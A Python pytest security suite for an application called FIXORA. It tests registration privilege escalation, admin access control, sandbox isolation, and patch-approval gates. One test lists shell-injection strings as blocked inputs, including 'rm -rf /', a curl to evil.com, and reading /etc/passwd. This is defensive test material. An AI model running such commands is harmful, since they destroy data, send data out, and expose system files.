"""
Comprehensive security regression test suite for FIXORA.
Verifies:
1. Registration authorization security:
   - UserRegister schema ignores/rejects role field
   - Public registration unconditionally assigns role="user"
   - Tampered payload {"role": "admin"} / {"role": "owner"} does NOT elevate privileges
   - Ordinary users receive 403 on admin-only endpoints
   - Admin bootstrap creates an admin safely and grants admin access
2. Sandbox security and execution boundaries:
   - Untrusted code execution is blocked without Docker or remote worker
   - Security verdict returns EXECUTION_BLOCKED_CONTAINER_REQUIRED
   - Shell injection in commands is rejected/sanitized
   - Static analysis is clearly distinguished from dynamic test execution
   - Approval gate blocks unvalidated / unsupported patches
   - PR gate blocks PR creation when tests are not passed
"""

import uuid
import pytest
from unittest.mock import patch
from httpx import AsyncClient, ASGITransport

from app.main import app
from app.schemas.user import UserRegister
from app.orchestrator.sandbox.runner import DiagnosticSandboxRunner


# ---------------------------------------------------------------------------
# ISSUE 1: Registration and Authorization Security
# ---------------------------------------------------------------------------

def test_user_register_schema_omits_role():
    """Verify UserRegister schema does not accept role and ignores it if passed."""
    user_reg = UserRegister(
        email="test_user@example.com",
        password="ValidPassword123!",
        name="Test Normal User",
    )
    assert not hasattr(user_reg, "role") or getattr(user_reg, "role", None) is None

    # If extra fields like role are passed, extra="ignore" strips them
    user_reg_tampered = UserRegister.model_validate({
        "email": "test_tampered@example.com",
        "password": "ValidPassword123!",
        "name": "Tampered",
        "role": "admin"
    })
    assert not hasattr(user_reg_tampered, "role") or getattr(user_reg_tampered, "role", None) is None


@pytest.mark.asyncio
async def test_public_registration_assigns_user_role_only():
    """Verify standard public registration creates role='user' unconditionally."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        email = f"standard_user_sec_{uuid.uuid4().hex[:8]}@fixora.test"
        response = await ac.post("/api/auth/register", json={
            "email": email,
            "password": "StandardSecurePassword123!",
            "name": "Standard User"
        })
        assert response.status_code == 200, response.text
        data = response.json()
        assert "data" in data
        assert data["data"]["user"]["role"] == "user"
        assert data["data"]["user"]["email"] == email


@pytest.mark.asyncio
async def test_public_registration_tampered_role_is_ignored():
    """Verify attempting to inject role='admin' or role='owner' results strictly in role='user'."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        for idx, malicious_role in enumerate(["admin", "owner", "superuser"]):
            email = f"priv_escalation_{uuid.uuid4().hex[:8]}_{idx}@fixora.test"
            response = await ac.post("/api/auth/register", json={
                "email": email,
                "password": "AttackerSecurePassword123!",
                "name": f"Attacker {malicious_role}",
                "role": malicious_role
            })
            assert response.status_code == 200, response.text
            data = response.json()
            assert data["data"]["user"]["role"] == "user", (
                f"Security breach: user was created with role {data['data']['user']['role']} instead of 'user'"
            )


@pytest.mark.asyncio
async def test_admin_endpoints_require_admin_role():
    """Verify non-admin users receive 403 Forbidden on admin-protected endpoints."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        # 1. Register a normal user
        email = f"normal_sec_tester_{uuid.uuid4().hex[:8]}@fixora.test"
        reg_res = await ac.post("/api/auth/register", json={
            "email": email,
            "password": "NormalUserPass123!",
            "name": "Normal Sec Tester"
        })
        assert reg_res.status_code == 200
        token = reg_res.json()["data"]["accessToken"]
        auth_header = {"Authorization": f"Bearer {token}"}

        # 2. Access /api/auth/admin/status -> Must return 403 Forbidden
        admin_status_res = await ac.get("/api/auth/admin/status", headers=auth_header)
        assert admin_status_res.status_code == 403
        assert "Administrator privileges required" in admin_status_res.json()["detail"]

        # 3. Access /api/settings/validate -> Must return 403 Forbidden
        validate_res = await ac.get("/api/settings/validate", headers=auth_header)
        assert validate_res.status_code == 403
        assert "Administrator privileges required" in validate_res.json()["detail"]


@pytest.mark.asyncio
async def test_admin_bootstrap_and_access():
    """Verify admin user created via bootstrap has role='admin' and can access admin endpoints."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        # Login using the bootstrapped administrator
        login_res = await ac.post("/api/auth/login", json={
            "email": "testadmin@fixora.dev",
            "password": "TestAdminPass2026!"
        })
        assert login_res.status_code == 200
        admin_data = login_res.json()["data"]
        assert admin_data["user"]["role"] == "admin"
        admin_token = admin_data["accessToken"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}

        # Access /api/auth/admin/status -> Must return 200 OK
        res = await ac.get("/api/auth/admin/status", headers=admin_headers)
        assert res.status_code == 200
        res_data = res.json()["data"]
        assert res_data["role"] == "admin"
        assert res_data["adminAccessGranted"] is True


# ---------------------------------------------------------------------------
# ISSUE 2: Sandbox Isolation and Validation Gates
# ---------------------------------------------------------------------------

def test_sandbox_blocks_untrusted_host_execution_when_docker_unavailable():
    """Verify DiagnosticSandboxRunner blocks host execution and flags missing container runtime."""
    runner = DiagnosticSandboxRunner()

    with patch.object(runner, "is_docker_available", return_value=False), \
         patch.object(runner, "is_remote_worker_configured", return_value=False):
        
        result = runner.execute_validation(
            file_path="repair.py",
            original_code="def add(a, b): return a",
            proposed_code="def add(a, b): return a + b",
            test_command="pytest tests/"
        )

        assert not result["tests_passed"]
        assert result["status"] == "unsupported"
        assert result["security_verdict"] == "EXECUTION_BLOCKED_CONTAINER_REQUIRED"
        assert not result["isolated"]
        assert not result["is_complete_test_validation"]
        assert "Execution Blocked: Untrusted repository test execution is disabled" in result["output"]


def test_sandbox_static_check_distinguished_from_dynamic_tests():
    """Verify static syntax check succeeds without claiming dynamic test validation."""
    runner = DiagnosticSandboxRunner()
    static_result = runner.execute_static_check(
        file_path="repair.py",
        proposed_code="def calculate_total(prices):\n    return sum(prices)\n"
    )
    assert static_result["syntax_valid"] is True
    assert static_result["validation_type"] == "static_syntax_check"
    assert static_result["tests_passed"] is False
    assert static_result["is_complete_test_validation"] is False
    assert "PASSED" in static_result["output"]


def test_sandbox_rejects_malicious_command_characters():
    """Verify dangerous shell injection characters (; && | `) are detected and blocked."""
    runner = DiagnosticSandboxRunner()
    
    dangerous_commands = [
        "pytest; rm -rf /",
        "pytest && curl https://evil.com/leak",
        "pytest || cat /etc/passwd",
        "pytest `whoami`",
        "pytest $(id)",
        "pytest & bg_job",
        "pytest > /tmp/pwned",
        "bash -c evil"
    ]
    for cmd in dangerous_commands:
        assert not runner.validate_command_safety(cmd)
        result = runner.execute_validation(
            file_path="repair.py",
            original_code="x = 1",
            proposed_code="x = 2",
            test_command=cmd
        )
        assert not result["tests_passed"]
        assert result["security_verdict"] == "COMMAND_DISALLOWED"
        assert "not in the sandbox allowlist" in result["output"]


@pytest.mark.asyncio
async def test_patch_approval_blocked_without_passing_test_run():
    """Verify approval endpoint raises HTTP 400 when sandbox tests have not passed."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        # First list patches to get an existing patch
        list_res = await ac.get("/api/patches")
        assert list_res.status_code == 200
        patches = list_res.json()["data"]
        assert len(patches) > 0
        
        # Test approving a patch where tests are unsupported or not passed
        test_patch = patches[0]
        patch_id = test_patch["id"]

        # Run tests (with Docker unavailable, test run status is 'unsupported')
        run_res = await ac.post(f"/api/patches/{patch_id}/run-tests")
        assert run_res.status_code == 200
        tr_data = run_res.json()["data"]
        # Since docker is not running on host/sandbox, status should be unsupported
        assert tr_data["status"] == "unsupported"

        # Attempt to approve the patch -> Must be rejected with 400
        approve_res = await ac.post(f"/api/patches/{patch_id}/approve")
        assert approve_res.status_code == 400
        assert "Security validation required" in approve_res.json()["detail"]


@pytest.mark.asyncio
async def test_pr_creation_blocked_without_approval_and_passing_tests():
    """Verify create-pr endpoint raises HTTP 400 when patch is unapproved or tests unpassed."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        list_res = await ac.get("/api/patches")
        assert list_res.status_code == 200
        patches = list_res.json()["data"]
        assert len(patches) > 0
        patch_id = patches[0]["id"]

        # Attempt to create PR on unapproved patch -> Must be rejected with 400
        pr_res = await ac.post(f"/api/patches/{patch_id}/create-pr")
        assert pr_res.status_code == 400
        assert ("Human approval required" in pr_res.json()["detail"] or 
                "Validation gate violation" in pr_res.json()["detail"])
